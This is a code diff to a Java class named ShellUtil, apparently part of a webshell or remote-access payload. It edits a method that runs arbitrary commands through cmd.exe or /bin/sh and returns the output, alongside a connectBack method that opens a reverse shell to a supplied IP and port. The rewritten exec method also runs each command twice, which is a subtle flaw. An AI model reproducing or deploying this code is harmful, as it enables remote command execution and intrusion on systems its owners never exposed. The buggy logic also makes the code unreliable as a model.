@@ -1,5 +1,6 @@
 import java.io.*;
 import java.net.Socket;
+import java.util.concurrent.RecursiveTask;
 
 public class ShellUtil extends Object{
     public static String run(String methodName, String params, String encoding) {
@@ -10,8 +11,7 @@ public class ShellUtil extends Object{
             String ip = params.substring(0, params.indexOf("^"));
             String port = params.substring(params.indexOf("^") + 1);
             res = ShellUtil.connectBack(ip, Integer.parseInt(port));
-        }
-        else {
+        }else {
             res = "unkown methodName";
         }
         return res;
@@ -20,10 +20,53 @@ public class ShellUtil extends Object{
     public static String exec(String command, String encoding) {
         StringBuffer result = new StringBuffer();
         try {
-            BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(command).getInputStream(), encoding));
-            String stemp = "";
-            while ((stemp = myReader.readLine()) != null) result.append(stemp + "\n");
-            myReader.close();
+            String[] finalCommand;
+            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+                String systemRootvariable;
+                try {
+                    systemRootvariable = System.getenv("SystemRoot");
+                }
+                catch (ClassCastException e) {
+                    systemRootvariable = System.getProperty("SystemRoot");
+                }
+                finalCommand = new String[3];
+                finalCommand[0] = systemRootvariable+"\\system32\\cmd.exe";
+                finalCommand[1] = "/c";
+                finalCommand[2] = command;
+            } else { // Linux or Unix System
+                finalCommand = new String[3];
+                finalCommand[0] = "/bin/sh";
+                finalCommand[1] = "-c";
+                finalCommand[2] = command;
+            }
+            BufferedReader readerIn = null;
+            BufferedReader readerError = null;
+            try {
+                readerIn = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(finalCommand).getInputStream(),encoding));
+                String stemp = "";
+                while ((stemp = readerIn.readLine()) != null){
+                    result.append(stemp).append("\n");
+                }
+            }catch (Exception e){
+                result.append(e.toString());
+            }finally {
+                if (readerIn != null) {
+                    readerIn.close();
+                }
+            }
+            try {
+                readerError = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(finalCommand).getErrorStream(), encoding));
+                String stemp = "";
+                while ((stemp = readerError.readLine()) != null){
+                    result.append(stemp).append("\n");
+                }
+            }catch (Exception e){
+                result.append(e.toString());
+            }finally {
+                if (readerError != null) {
+                    readerError.close();
+                }
+            }
         } catch (Exception e) {
             result.append(e.toString());
         }
@@ -46,7 +89,7 @@ public class ShellUtil extends Object{
                 try {
                     xp = new BufferedReader(new InputStreamReader(this.sp));
                     ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
-                    char buffer[] = new char[8192];
+                    char buffer[] = new char[1024];
                     int length;
                     while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
                         ydg.write(buffer, 0, length);
@@ -79,4 +122,6 @@ public class ShellUtil extends Object{
         }
         return "^OK^";
     }
+
+
 }
